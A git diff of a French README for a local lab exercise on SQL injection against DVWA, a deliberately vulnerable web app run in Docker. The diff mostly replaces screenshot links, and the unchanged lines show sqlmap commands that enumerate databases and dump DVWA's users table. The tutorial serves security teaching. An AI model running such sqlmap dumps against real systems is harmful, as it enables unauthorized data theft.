@@ -27,7 +27,8 @@ Comme `1=1` est toujours vrai, la requête renvoie toutes les lignes de la table
 ```bash
 docker network create dvwa-network
 ```
-![dvwa-network](Screenshot 2024-12-19 210102.png)
+![Screenshot 2024-12-19 210102](https://github.com/user-attachments/assets/22a42101-1819-47d1-877c-b1d673993446)
+
 
 ### 2. Lancer DVWA avec MySQL
 
@@ -69,7 +70,8 @@ Exécutez :
 ```bash
 docker-compose up -d
 ```
-![Lancer les conteneurs docker](Screenshot 2024-12-19 210732.png)
+![Screenshot 2024-12-19 210732](https://github.com/user-attachments/assets/269966e3-8f88-4619-9f02-7cc466a65e30)
+
 
 ### 3. Lancer Kali Linux (facultatif)
 
@@ -84,21 +86,22 @@ sudo apt update && sudo apt install sqlmap
 ### 1. Accéder à DVWA
 
 Ouvrez votre navigateur et accédez à `http://localhost`. Configurez DVWA (database setup). Assurez-vous de choisir le niveau de sécurité "Low" pour cet exercice.
-![Accès à DVWA](Screenshot 2024-12-19 211119.png)
+![Screenshot 2024-12-19 211119](https://github.com/user-attachments/assets/e8bfe0c5-7811-428b-882e-de7ad6338132)
 
-![Alt text](Screenshot 2024-12-19 211137.png)
+![Screenshot 2024-12-19 211137](https://github.com/user-attachments/assets/224f6481-7228-4b9b-9d55-1f424db4c272)
 
-![Alt text](Screenshot 2024-12-19 211300.png)
+![Screenshot 2024-12-19 211300](https://github.com/user-attachments/assets/6e391cfe-0333-4b45-834a-5babec11850c)
 
-![Alt text](Screenshot 2024-12-19 211733.png)
+![Screenshot 2024-12-19 211733](https://github.com/user-attachments/assets/fdd5e1ca-393a-49c0-a4c8-f568358b3c7b)
 
 ### 2. Identifier la vulnérabilité
 
 Dans DVWA, allez dans "SQL Injection". Entrez un ID (par exemple, 1). Observez l'URL. Elle devrait ressembler à ceci : `http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#`.
 
-![Alt text](Screenshot 2024-12-19 211821.png)
+![Screenshot 2024-12-19 211821](https://github.com/user-attachments/assets/55b71d7b-c07c-4e3d-b387-31806c4b16c6)
 
-![Alt text](Screenshot 2024-12-19 211836.png)
+![Screenshot 2024-12-19 211836](https://github.com/user-attachments/assets/5b2048b1-1be8-4f46-a1ae-a8d2144cb547)
+
 
 ### 3. Utilisation de sqlmap
 
@@ -107,27 +110,31 @@ Dans DVWA, allez dans "SQL Injection". Entrez un ID (par exemple, 1). Observez l
 ```bash
 sqlmap -u http://localhost/vulnerabilities/sqli/?id=1 --dbs --batch --level 1
 ```
-![sqlmap Test Vulnerability](Screenshot 2024-12-19 212018.png)
+![Screenshot 2024-12-19 212018](https://github.com/user-attachments/assets/447585f6-6328-49bf-a470-d81d9d9c43a6)
+
 
 #### Lister les tables d'une base de données
 
 ```bash
 sqlmap -u http://localhost/vulnerabilities/sqli/?id=1 -D dvwa --tables --batch --level 1
 ```
-![sqlmap List Tables](Screenshot 2024-12-19 212121.png)
+![Screenshot 2024-12-19 212121](https://github.com/user-attachments/assets/f9218dd7-dbff-4135-8cc1-3a0d44f16f9d)
+
 
 #### Lister les colonnes d'une table
 
 ```bash
 sqlmap -u http://localhost/vulnerabilities/sqli/?id=1 -D dvwa -T users --columns --batch --level 1
 ```
-![sqlmap List Columns](Screenshot 2024-12-19 214207.png)
+![Screenshot 2024-12-19 214207](https://github.com/user-attachments/assets/1817015e-ed3e-41b3-820c-4c3ab13413e5)
+
 #### Récupérer les données d'une table
 
 ```bash
 sqlmap -u http://localhost/vulnerabilities/sqli/?id=1 -D dvwa -T users --dump --batch --level 1
 ```
-![sqlmap Dump Data](Screenshot 2024-12-19 214232.png)
+![Screenshot 2024-12-19 214232](https://github.com/user-attachments/assets/c02bd939-9908-49cb-b0a8-7a680066cadb)
+
 ## Résumé
 
 Ce TP a permis de comprendre les bases de l'injection SQL, de mettre en place un environnement de test avec Docker, DVWA et Kali Linux, et d'utiliser `sqlmap` pour exploiter une vulnérabilité d'injection SQL.
